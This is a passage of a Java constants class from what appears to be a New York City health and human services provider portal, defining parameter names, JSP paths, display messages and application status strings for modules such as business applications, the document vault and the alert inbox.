	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_TYPE = "type";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_BRANCH_ID = "branchid";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_PARENT_ID = "parentid";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_EVIDENCE_REQ_FLAG = "evidencerequiredflag";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_ACTIVE_FLAG = "activeflag";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_SELECTION_FLAG = "selectionflag";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_DESCRIPTION = "description";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SUMMARY_LIST = "loApplicationSummaryList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SUMMARY_INFO = "applicationSummaryInfo";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_BASIC_SUMMARY_LIST = "loBasicSummaryList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_BOARD_SUMMARY_LIST = "loBoardSummaryList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_FILING_SUMMARY_LIST = "loFilingSummaryList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_POLICIES_SUMMARY_LIST = "loPoliciesSummaryList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DOC_CATEGORY = "asDocCategory";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DOC_TYPE_XML = "aoDocTypeXML";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DOC_TYPE = "asDocType";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_GEOGRAPHY_SEL_BY_USER = "geographySelectedByUser";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ELEMENT_ID_LIST = "aoElementIdList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_MAP = "lohTaxonomyMap";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_TYPE_MAP = "TaxonomyTypeMap";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_ID_LIST = "loTaxonomyIdList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_READ_ONLY = "loReadOnly";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_OTHER_CHECKED = "other_checked";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LANG_CHECK_BOX = "language_checkbox";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LANG_LIST_BOX = "language_listbox";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LANG_SELECTED_BY_USER = "languageSelectedByUser";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LANG_ID_SELECT_LIST = "moLanguageIdSelectList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_TREE_LIST = "loTaxonomyTreeList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_LIST = "TaxonomyList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LANGUAGE_ID_LIST = "moLanguageIdList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ERROR_TO_DISPLAY = "errorToDisplay";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_IS_OTHER_SELECTED = "isOtherSelected";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_PATH_LANG_JSP = "/WEB-INF/jsp/businessapplication/language.jsp";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_PATH_ERROF_JSP = "/WEB-INF/jsp/businessapplication/errorHandler.jsp";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_CONTENT_DISPOSITION = "Content-Disposition";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_POPULATION_NAME = "population_name";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_OTHER = "other";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_NO_POPULATION = "noPopulation";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_OTHER_POPULATION = "otherpopulation";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DELETE_OTHER_DATA = "deleteOtherData";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_INSERT_OTHER_DATA = "insertOtherData";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_REQUIRED_ERROR = "requiredError";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ERROR_FLAG = "errorFlag";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ERROR_MSG_OTHER = "errorMsgOther";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ERROR_LIST = "errorList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_PATH_POPULATION_JSP = "/WEB-INF/jsp/businessapplication/population.jsp";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_POPULATION = "loPopulation";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ERROR_TO_DISPLAY_FOR_OTHER = "errorToDisplayForOther";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ERROR_TO_DISPLAY_FOR_REQ = "errorToDisplayForRequired";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_JAVAX_SERVLET_REQUEST = "javax.servlet.request";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ELEMENT_TYPE = "elementtype";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_PROPERTY = "property";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ROW_ID = "rowid";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ID = "id";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_FILE = "file";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DOC_NAME = "docname";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LINE_ELT = "lineElt";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_NAME = "name";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_SCHEMA_NAME = "schemaname";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_FORM_TEMPLATE = "formtemplate";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ADD$ = "add$";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_$LIN3$ = "$lin3$";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_STATUS = "asAppStatus";
	public static final String PORTLET_PROPERTY_YOUR_NAME = "yourname";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_MASTER_TOPIC_LIST = "masterTopicList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TOPIC_LIST_MASTER = "topicListMaster";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TOPIC_LIST = "topicList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LINK_VALUE = "linkValue";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_FILE_PATH = "filePath";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_SELECTED_VALUE = "selectedValue";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_MAINTENANCE = "maintenance";
	public static final String BUZ_APP_SUB_SECTION_SUBMIT_BUTTON = "submitButtonValue";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TOPIC_NAME = "topicName";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TOPIC_ID = "topicId";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_PROV_ADDC_LIKD = "provideraddclikd";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_AGENCY_ADDC_LIKD = "agencyaddclikd";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_NEW_UNTITLED_TOPIC = "new untitled topic";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_MASTER_BEAN = "lsMasterBean";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_MAINTENANCE_ADD_TOPIC = "maintenance_add_topic";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_GET_TOPIC_LIST = "getTopicList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_RETURNED_LIST = "returned list";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_PROV_PREVIEW_CLIKD = "providerpreviewclikd";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_AGENCY_PREVIEW_CLIKD = "agencypreviewclikd";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LI_TOPIC_ID = "liTopicId";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DELETE_REQUEST = "deleteRequest";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DETAIL_BEAN = "lsDetailBean";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DELETE_QUESTION = "deleteQuestion";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_FORM_SUBMIT = "formsubmit";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_SELECTED_QUESTION = "selectedQuestion";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_SELECTED_ANSWER = "selectedAnswer";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTIONS_LIST = "questionsList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_MAINTENANCE_FAQ = "maintenanceFaq";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_USER = "user";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_PROVIDER_USER = "provider_user";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_CITY_USER = "city_user";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_MANAGER = "manager";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_USER_MAP = "UserMap";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_CITY_MANAGER = "city_manager";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_BEAN = "loApplicationBean";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TERMS_CONDITIONS = "lsTermsConditions";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_FIRST_ACTION = "first_action";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ITEM_LIST = "itemList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_CURRENT_ITEM_LIST = "currentItemList";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ACTION_REDIRECT = "action_redirect";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_HYPERLINK = "Hyperlink";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_STARTED = "started";

	/*****************************************************************************************/
	public static final String ACC_DISPLAY_FILE = "accdisplayfileinfo";
	public static final String HELP_DOCUMENTS = "/portlet/faqhelp/helpdocuments.jsp";
	public static final String HELP_FAQ = "/portlet/faqhelp/helpFAQ.jsp";

	public static final String OPEN_TRANSACTION = "open_transaction";
	public static final String SAVE_TRANSACTION = "save_transaction";

	public static final String NOT_STARTED_STATE = "Not Started";
	public static final String DRAFT_STATE = "Draft";
	public static final String PARTIALLY_COMPLETE_STATE = "Partially Complete";
	public static final String COMPLETED_STATE = "Complete";

	public static final String EVENT_NAME = "eventName";
	public static final String EVENT_TYPE = "eventType";
	public static final String AUDIT_DATE = "auditDate";

	public static final String ENTITY_TYPE = "entityType";
	public static final String ENTITY_ID = "entityId";
	public static final String ENTITY_IDENTIFIER = "entityIdentifier";
	public static final String SECTIONID = "sectionId";

	public static final String COMMENTS = "comments";
	public static final String MODIFIED_BY = "modifiedBy";
	public static final String MODIFIED_DATE1 = "modifiedDate";

	public static final String APPLICATION_TYPE = "applicationType";

	public static final String NEW_STATUS_VALUE = "newStatusValue";
	public static final String OLD_STATUS_VALUE = "oldStatusValue";
	public static final String SERVICE_ELEMENT = "serviceElementId";

	public static final String VIEW_HISTORY_VALUE = "viewHistory";
	public static final String ACTION_REDIRECT = "action_redirect";

	public static final String PRINT_NO_CONTENT_MESSAGE = "This Section has not been started";
	public static final String PRINT_POPULATION_MESSAGE = "My organization offers specialized programs for any of the following populations:";
	public static final String PRINT_POPULATION_NO_SPECIFIC_MESSAGE = "My organization does not service a specific population";
	public static final String PRINT_GEOGRAPHY_MESSAGE = "My organization servers the following geographies:";
	public static final String PRINT_GEOGRAPHY_NO_MESSAGE = "My organization is not geographically based.";
	public static final String PRINT_LANGUAGE_MESSAGE = "My organization can communicate and provide services in the following languages:";
	public static final String PRINT_LANGUAGE_MORE_MESSAGE = "In addition to the languages selected above, my organization has access to language interpretation services.";
	public static final String PRINT_SPECIALIZATION_NO_MESSAGE = "No specialization within this service applies to my organization";
	public static final String PRINT_SERVICE_SETTING_NO_MESSAGE = "My organization does not provide selected Service in a specialized setting.";

	public static final String HEADER_DOC_NAME = "Document Name";
	public static final String HEADER_DOC_INFO = "Document Info";
	public static final String HEADER_DOC_TYPE = "Document Type";
	public static final String HEADER_DOC_STATUS = "Status";
	public static final String HEADER_DOC_MODIFIED = "Modified";
	public static final String HEADER_DOC_MODIFIED_BY = "Last Modified By";
	public static final String WORKFLOW_LAUNCH_SECTION_IDS_SEQUENCE[] =
	{ BUSINESS_APPLICATION_SECTION_BASICS, BUSINESS_APPLICATION_SECTION_BOARD, BUSINESS_APPLICATION_SECTION_FILINGS,
			BUSINESS_APPLICATION_SECTION_POLICIES };
	public static final String WORKFLOW_LAUNCH_SECTION_TASKNAMES[] =
	{ P8Constants.PROPERTY_PE_TASK_TYPE_SECTION_BASIC, P8Constants.PROPERTY_PE_TASK_TYPE_SECTION_BOARD,
			P8Constants.PROPERTY_PE_TASK_TYPE_SECTION_FILINGS, P8Constants.PROPERTY_PE_TASK_TYPE_SECTION_POLICIES };
	public static final String QUESTION_DISPLAY = "Questions";
	public static final String DOCUMENTS_DISPLAY = "Documents";
	public static final String GEOGRAPHY_DISPLAY = "Geography";
	public static final String LANGUAGES_DISPLAY = "Languages";
	public static final String POPULATIONS_DISPLAY = "Populations";
	public static final String SERVICE_SETTING_DISPLAY = "Service Setting";
	public static final String SPECIALIZATION_DISPLAY = "Specialization";
	public static final String CONTRACT_GRANT_DISPLAY = "Contract/Grant";
	public static final String KEY_STAFF_DISPLAY = "Key Staff";
	public static final String SECTION_NAMES[] =
	{ BUSINESS_APPLICATION_SECTION_BASICS, BUSINESS_APPLICATION_SECTION_FILINGS, BUSINESS_APPLICATION_SECTION_BOARD,
			BUSINESS_APPLICATION_SECTION_POLICIES };
	public static final String SECTION_NAMES_DISPLAY_PRINT[] =
	{ "Basics Section", "Filings Section", "Board Section", "Policies Section" };
	public static final String SECTION_NAMES_XML[] =
	{ "Basics", "Filings", "Board", "Policies" };
	public static final String SUB_SECTION_NAMES_MAPPING[][] =
	{
			{ BUZ_APP_SUB_SECTION_QUESTION, BUSINESS_APPLICATION_SUB_SECTION_DOCUMENTS,
					BUSINESS_APPLICATION_SUB_SECTION_GEOGRAPHY, BUSINESS_APPLICATION_SUB_SECTION_LANGUAGES,
					BUSINESS_APPLICATION_SUB_SECTION_POPULATIONS },
			{ BUZ_APP_SUB_SECTION_QUESTION, BUSINESS_APPLICATION_SUB_SECTION_DOCUMENTS },
			{ BUZ_APP_SUB_SECTION_QUESTION, BUSINESS_APPLICATION_SUB_SECTION_DOCUMENTS },
			{ BUZ_APP_SUB_SECTION_QUESTION } };

	/** Missing Profile Information Start **/

	public static final String MISSING_PROFILE_INFORMATION = "missingprofile";
	public static final String MISSING_PROFILE_TERMS_CONDITIONS = "applicationterms";
	public static final String MISSING_PROFILE_EIN_TIN_SEARCH = "eintinsearch";
	public static final String MISSING_PROFILE_ACCT_ALREADY_CREATED = "accalreadycreated";
	public static final String MISSING_PROFILE_USER_REQUEST_SUBMITTED = "useracctrequestsubmitted";
	public static final String MISSING_PROFILE_ACCT_ADMIN = "accadministrator";
	public static final String MISSING_PROFILE_ACCT_ADMIN_IDENTIFICATION = "accadminidentification";
	public static final String MISSING_PROFILE_CREATE_ADMIN_ACCOUNT = "createadminacct";
	public static final String MISSING_PROFILE_ORG_ACCT_REQUEST_SUBMITTED = "orgacctrequestsubmitted";
	public static final String MISSING_PROFILE_ORG_ACCT_CREATED = "orgacctcreated";
	public static final String MISSING_PROFILE_ACCT_REQUEST_SUBMISSION = "accrequestsubmission";
	public static final String MISSING_PROFILE_CREATE_ADMIN_ACCT_READONLY = "createadminacctreadonly";

	public static final String ORG_CORPORATE_FOR_PROFIT = "For Profit";
	public static final String ORG_CORPORATE_NON_PROFIT = "Non Profit";

	/** Missing Profile Information End **/

	/** Password Reset Email Start **/

	public static final String PASSWOR_RESET_EMAIL_ACTION_PARAMETER = "passwordresetemail";
	public static final String PASSWOR_RESET_EMAIL = "passwordreset";
	public static final String PASSWOR_RESET_SECURITY_QUESTIONS = "passwordresetsecurity";
	public static final String PASSWOR_RESET = "pwdresetnewpwd";
	public static final String PASSWOR_LOGIN = "loginportlet";
	/** Password Reset Email End **/

	/** Account Request Module Start */
	public static final String CAPTCHA = "captcha";
	public static final String REGISTER_NYC_ID_FORM_JSP = "registernycidform";
	public static final String ACCOUNT_REQUEST_SUBMITTED_JSP = "accountrequestsubmitted";
	public static final String REGISTER_NYC_ID_ACTION_PARAMETER = "registernycid";

	/*** Account Request Module End *****/

	public static final String SPECIALIZATION = "specialization";
	public static final String SERVICE_SETTING = "servicesetting";
	public static final String SERVICE_SETTING_DISPLAYNAME = "Service Setting";

	/*** Alert Inbox Module Start *****/
	public static final String ALERT_VIEW_NEXT_ACTION_PARAMETER = "next_action";
	public static final String ALERT_VIEW_SHOW_PAGE_PARAMETER = "showpage";
	public static final String ALERT_VIEW_SHOW_DETAIL_PAGE_PARAMETER = "showdetails";
	public static final String ALERT_VIEW_DELETE_PARAMETER = "delete";
	public static final String ALERT_VIEW_DELETE_MANY_PARAMETER = "deleteMany";
	public static final String ALERT_VIEW_APPLY_FILTER_PARAMETER = "applyFilter";
	public static final String ALERT_VIEW_NOTIFICATION_ID_PARAMETER = "notificationId";
	public static final String ALERT_VIEW_NOTIFICATION_IDS_PARAMETER = "notificationIds";
	public static final String ALERT_VIEW_NEXT_PAGE_PAGING_PARAMETER = "nextPage";
	public static final String ALERT_VIEW_PREVIOUS_PAGE_PAGING_PARAMETER = "previousParent";
	public static final String ALERT_VIEW_FROM_DATE_PARAMETER = "01/01/1800";

	public static final String ALERT_VIEW_SHOW_DETAIL_RESULT = "alertInboxBean";
	public static final String ALERT_VIEW_ROW_COUNT_RESULT = "rowCount";
	public static final String ALERT_VIEW_FILTER_LIST_RESULT = "filterList";
	public static final String ALERT_VIEW_ITEM_LIST_RESULT = "itemList";
	public static final String ALERT_VIEW_NEXT_OPEN_RESULT = "next_open";
	public static final String ALERT_VIEW_NEXT_ACTION_RESULT = "next_action";

	public static final String ALERT_VIEW_PAGING_RECORDS = "records";
	public static final String ALERT_VIEW_PAGING_PAGE_INDEX = "pageIndex";

	public static final String ALERT_VIEW_FILTER_ALERT_TYPE = "alerttype";
	public static final String ALERT_VIEW__FILTER_DATE_FROM = "datefrom";
	public static final String ALERT_VIEW_FILTER_DATE_TO = "dateto";

	public static final String SERVICE_APPLICATION_ID = "service_app_id";
	/*** Alert Inbox Module End *****/

	/*** DOCUMENT VAULT Module Start *****/
	public static final String DOCUMENT_EXCEPTION = "Exception";

	public static final String SHARE_DOCUMENT_STEP1 = "shareDocumentStep1";
	public static final String PROVIDER_NAMES = "providerNames";
	public static final String PROVIDER_NAMES_RETURNED = "lsProvName";

	public static final String SHARE_DOCUMENT_STEP2 = "shareDocumentStep2";
	public static final String SHARE_DOCUMENT_STEP3 = "shareDocumentStep3";
	public static final String SHARE_DOCUMENT_STEP4 = "shareDocumentStep4";
	public static final String UNSHARE_DOCUMENT_ALL = "unsharedocumentall";
	public static final String UNSHARED_DOCUMENT_BY_PROVIDER = "unsharedocumentbyprovider";
	public static final String DISPLAY_SHARED_DOCUMENT = "displaySharedDocuments";
	public static final String DOCUMENT_UPLOAD = "documentupload";
	public static final String BACK_REQUEST = "backrequest";
	public static final String FILE_INFORMATION = "fileinformation";
	public static final String FILTER_DOCUMENTS = "filterDocuments";
	public static final String VIEW_DOCUMENT_INFO = "viewDocumentInfo";
	public static final String EDIT_DOCUMENT_PROPS = "editDocumentProps";
	public static final String VIEW_VERSION_HISTORY = "viewVersionHistory";
	public static final String ADD_NEW_VERSION = "addNewVersion";
	public static final String CLEAR_FILTERS = "clearfilters";
	public static final String NO_ACTION = "noaction";
	public static final String SHOW_DOCUMENT_LIST = "showdocumentlist";
	public static final String CHECK_LINK_DOCUMENT_BEFORE_DELETE = "checkLinkDocumentBeforedelete";

	public static final String PROVIDER_NAME = "proNameString";
	public static final String AGENCY_SET = "agencySet";
	public static final String SHARE_DOCUMENTS_LIST = "shareDocumentsList";
	public static final String PROVIDER_AGENCY_LIST = "loProvAgencyList";
	public static final String SHARED_DOCUMENTS = "sharedDocuments";
	public static final String PROVIDER_SET = "providerSet";
	public static final String PROVIDER_LIST = "providerList";
	public static final String PROVIDER_ARRAY = "providerArray";
	public static final String DOCUMENT_NAME = "documentName";
	public static final String SAMPLE = "sample";
	public static final String DOCUMENT_CATEGORY = "category";
	public static final String LINKED_TO_APP = "linkedToApp";
	public static final String LINKED_TO_APP_FLAG = "lbFlag";
	public static final String SHARED_FLAG = "sharedFlag";
	public static final String EDIT_VERSION_PROP = "EditVersionProp";
	public static final String IS_LOCKED_STATUS = "isLocked";
	public static final String DOC_NAME = "docName";
	public static final String DOC_VERSION_LIST = "docVersionsList";
	public static final String MAX_DOCUMENT_ID = "maxDocumentId";
	public static final String MESSAGE = "message";
	public static final String MESSAGE_TYPE = "messageType";
	public static final String RESPONSE_MESSAGE = "responsemsg";
	public static final String FILE_PATH_FOR_DOCUMENT_LIST = "filePathForDocumentList";
	public static final String IS_AJAX_CALL = "isAjaxCall";
	public static final String DOCS_CATEGORY = "documentCategory";
	public static final String DOCS_TYPE = "documentType";
	public static final String DOC_SAMPLE = "Sample Document";
	public static final String SAMPLE_DOC_CATEGORY = "sampledoccategory";
	public static final String SAMPLE_DOC_TYPE = "sampledoctype";
	public static final String PROV_LIST = "provList";
	public static final String AGENCY_LIST = "agencyList";
	public static final String APPLICATION_SETTING = "applicationSetting";
	public static final String UNSHARE_BY = "unshareBy";
	public static final String REMOVE_SELECTED = "removeselected";
	public static final String DOCUMET_VAULT_CONTROLLER_TYPE = "type";
	public static final String DOCUMET_VAULT_CONTROLLER_SUCCESS = "Success";
	public static final String ERROR_MAP = "errorMap";
	public static final String DOCUMENT_SHARED_STATUS = "Shared";

	public static final String DOCUMENT_NOT_SHARED_STATUS = "Not Shared";
	public static final String DOCUMENT_TYPE_HELP = "Help";
	public static final String DOCUMENT_TYPE_SYSTEM_TERMS_AND_CONDITIONS = "System Terms & Conditions";
	public static final String DOCUMENT_TYPE_APPLICATION_TERMS_AND_CONDITIONS = "Application Terms & Conditions";
	public static final String DOCUMENT_TYPE_APPENDIX_A = "Appendix A";
	public static final String DOCUMENT_TYPE_LICENSES = "Licenses/Certifications/Permits";
	public static final String DOCUMENT_TYPE_STANDARD_CONTRACT = "Standard Contract";
	public static final String PROPERTY_TYPE_STRING = "string";
	public static final String PROPERTY_TYPE_DATE = "date";
	public static final String PROPERTY_TYPE_BOOLEAN = "boolean";
	public static final String PROPERTY_TYPE_INT = "int";
	public static final String LAST_MODIFIED_BY = "lastModifiedBy";
	public static final String SHARE_DOCUMENT_STATUS = "shareStatus";
	public static final String FILTER_CATEGORY = "filtercategory";
	public static final String FILTER_TYPE = "filtertype";
	public static final String MODIFIED_FROM = "modifiedfrom";
	public static final String MODIFIED_TO = "modifiedto";
	public static final String SHARED_STATUS = "shared";
	public static final String UN_SHARED_STATUS = "unshared";
	public static final String GET_DOCUMENT_CATEGORY = "doccategory";
	public static final String SORT_LIST_VERSION_NUMBER = "versionNo";
	public static final String PROV_AGENCY_LIST = "provAgencyList";
	public static final String DOCUMENT_VAULT_PROVIDER = "PROVIDER";
	public static final String DOCUMENT_VAULT_AGENCY = "AGENCY";
	public static final String PROV_NAME = "providerName";
	public static final String DOC_IDS = "docIds";
	public static final String ACCOUNT_CREATION = "Account Creation";
	public static final String ALERTS_NOTIFICATION = "Alerts/Notifications";
	public static final String HELP_APPLICATION = "Applications";
	public static final String DOCUMENT_VAULT = "Document Vault";
	public static final String HELP_CATEGORY_HOME = "Home";
	public static final String ORGANIZATION_INFORMATION = "Organization Information";
	public static final String HELP_CATEGORY_REPORTS = "Reports";
	public static final String PROVIDER_ID = "providerId";
	public static final String DOCUMENT_VAULT_USER = "user";
	public static final String OPERATION_TIME = "operationTime";
	public static final String DOCS_LAPSING_MASTER_MAP = "DocLapsingMasterMap";
	public static final String PERIOD_COVER_TO_MONTH = "PERIOD_COVER_TO_MONTH";
	public static final String PERIOD_COVER_TO_YEAR = "PERIOD_COVER_TO_YEAR";
	public static final String PERIOD_COVER_FROM_YEAR = "PERIOD_COVER_FROM_YEAR";
	public static final String PERIOD_COVER_FROM_MONTH = "PERIOD_COVER_FROM_MONTH";
	public static final String MODEL_VIEW_HOME = "home";
	public static final String CHECKED_OBJECT = "check";
	public static final String UNSHARE_BY_ALL = "all";
	public static final String PROVIDER_CHECK = "provCheck";
	public static final String BUSINESS_ERROR = "BusinessError";
	public static final String FILE_PATH = "filepath";
	public static final String FILENET_EXTENDED_DOC_TYPE = "filenetExtendedDoctype";
	public static final String SAMPLE_DOCUMENT_TYPE = "SampleDocType";
	public static final String SAMPLE_DOCUMENT_CATEGORY = "SampleDocCategory";
	public static final String IMPLEMENTATION_STATUS = "implementationstatus";
	public static final String MIME_UPLOAD_FILE = "uploadfile";
	public static final String MIME_UPLOAD_NEW_VERSION = "uploadnewversion";
	public static final String CALL_FROM_UPLOAD_VERSION = "callFrom";
	public static final String HELP_CATEGORY = "helpcat";
	public static final String DOCUMENT_DESCRIPTION = "docDesc";
	public static final String VERSION_PROPERTY = "VersionProp";

	public static final String FILTER_DOCUMENT = "filterdocuments";
	public static final String FILE_UPLOAD = "fileupload";
	public static final String CANCEL_REQUEST = "cancelrequest";
	public static final String SAVE_PROPERTIES = "saveProperties";
	public static final String CANCEL_EDIT = "cancelEdit";
	public static final String DELETE_DOCUMENT = "deleteDocument";
	public static final String BACK_TO_SHARED_STEP1 = "backtoSharedStep1";
	public static final String BACK_TO_SHARED_STEP2 = "backtoSharedStep2";
	public static final String BACK_TO_SHARED_STEP3 = "backtoSharedStep3";
	public static final String FINAL_SHARE_DOCUMENT = "finalShareDocument";
	public static final String REMOVE_ACCESS = "removeaccess";
	public static final String REMOVE_ACCESS_BY_PROVIDER = "removeaccessbyprovider";
	public static final String ERROR = "error";
	public static final String WORKFLOW_SUCCESS_MSG = "Your application succesfully submited for review.";
	public static final String WORKFLOW_SUCCESS_KEY = "workflow_success_key";
	public static final String FROM_UPLOAD_VERSION = "from_upload_version";
	public static final String CANCEL_DELETE = "canceldelete";
	/*** DOCUMENT VAULT Module End *****/

	public static final String AFTER_SUBMITION = "after_submission";

	public static final String SERVICE_SUB_SECTION_NAMES_MAPPING[] =
	{ BUZ_APP_SUB_SECTION_QUESTION, BUSINESS_APPLICATION_SUB_SECTION_DOCUMENTS, SPECIALIZATION, SERVICE_SETTING };
	public static final String ELEMENT_ID = "elementId";
	public static final String MAPPER_CLASS_APPLICATION = "com.nyc.hhs.service.db.services.application.ApplicationMapper";
	public static final String MAPPER_CLASS_QUESTION_ANSWER = "com.nyc.hhs.service.db.services.application.QuestionAnswerMapper";
	public static final String MAPPER_CLASS_APPLICATION_SUMMARY_MAPPER = "com.nyc.hhs.service.db.services.application.ApplicationSummaryMapper";
	public static final String MAPPER_CLASS_CONTACT_US = "com.nyc.hhs.service.db.services.application.ContactUsMapper";
	/** Application status */
	public static final String STATUS_DRAFT = "Draft";
	public static final String STATUS_IN_REVIEW = "In Review";
	public static final String STATUS_APPROVED = "Approved";
	public static final String STATUS_APPROVE = "Approve";
	public static final String STATUS_DEFFERED = "Deferred";
	public static final String STATUS_SUSPEND = "Suspended";
	public static final String STATUS_RETURNED_FOR_REVISIONS = "Returned for Revision";
	public static final String STATUS_REJECTED = "Rejected";
	public static final String STATUS_ACCEPTED = "Accepted";
	public static final String STATUS_WITHDRAWL = "Withdrawl";
	public static final String STATUS_EXPIRED = "Expired";
	public static final String STATUS_IN_PROGRESS = "In Progress";
	public static final String STATUS_NOT_APPLIED = "Not Applied";
	public static final String STATUS_NOT_STARTED = "Not Started";
	public static final String STATUS_WITHDRAWN = "Withdrawn";
	public static final String STATUS_WITHDRAW_REQUESTED = "Withdraw Requested";
	public static final String STATUS_CONDITIONALLY_APPROVED = "Conditionally Approved";
	public static final String STATUS_SUSPEND_FILING_EXPIRED = "Suspended (Filings Expired)";
	public static final String STATUS_RETURNED = "Returned";
	public static final String STATUS_RETURNED_AT_PROVIDER = "Returned for Revision (At Provider)";
	public static final String ENTITY_TYPE_BUSINESS_APPLICATION = "Business Application";
	public static final String ENTITY_TYPE_SERVICE_APPLICATION = "Service Application";
	public static final String PROPERTY_PE_TASK_NAME = "TaskName";

	/************ Maintenance Taxonomy */

	public static final String MAPPER_CLASS_TAXONOMY = "com.nyc.hhs.service.db.services.application.TaxonomyMapper";
	public static final String MAPPER_CLASS_SECURITY = "com.nyc.hhs.service.db.services.application.SecurityMapper";
	public static final String MAPPER_CLASS_FAQ = "com.nyc.hhs.service.db.services.application.FAQMapper";
	public static final String MAPPER_CLASS_NYC_REGISTER = "com.nyc.hhs.service.db.services.application.NycRegisterMapper";

	public static final String AUDIT_APP_SUBMISSION_PROVIDER_FLAG_TRUE = "true";
	public static final String AUDIT_APP_SUBMISSION_PROVIDER_FLAG_FALSE = "false";
	public static final String AUDIT_TYPE_APPLICATION = "application";
	public static final String AUDIT_TYPE_GENERAL = "general";

	public static final String AUDIT_APP_SUBMISSION_EVENT_NAME = "Business Application Submission";
